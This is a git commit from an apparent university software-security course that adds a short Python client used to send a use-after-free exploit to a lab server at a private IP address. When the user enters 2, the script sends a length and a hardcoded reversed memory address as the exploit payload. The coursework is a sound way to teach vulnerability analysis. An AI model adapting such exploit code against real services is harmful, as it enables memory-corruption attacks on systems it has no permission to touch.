bddeaecc2ebd4ceca4c566fbb01855d1ea26002c
L1n <490772448@qq.com>
2016-05-14 19:50:54 +0800

    UAF 漏洞演示需要的客户端,该客户端用来发送 exploit

---
+++ 软件安全与漏洞分析/第十一周任务/uaf_client.py
@@ -0,0 +1,38 @@
+#!/bin/env python3
+# -*- coding: utf-8 -*-
+# version: Python3.X
+''' Description
+'''
+__author__ = '__L1n__w@tch'
+
+import socket
+import sys
+
+HOST, PORT = "192.168.117.131", 9999
+
+if __name__ == "__main__":
+    # Create a socket (SOCK_STREAM means a TCP socket)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # Connect to server and send data
+        sock.connect((HOST, PORT))
+
+        while True:
+            received = sock.recv(1024)
+            print("Received: {}".format(received))
+
+            user_input = input("输入要发送的数据: ")
+            sock.sendall(user_input.encode("utf8"))
+            print("Sent: {}".format(user_input))
+
+            if int(user_input) == 2:
+                exploit_len = b"24"
+                exploit_data = b"\x00\x40\x42\xF0"[::-1]
+                sock.sendall(exploit_len)
+                sock.sendall(exploit_data)
+
+                received = sock.recv(1024)
+                print("Received: {}".format(received))
+    finally:
+        sock.close()
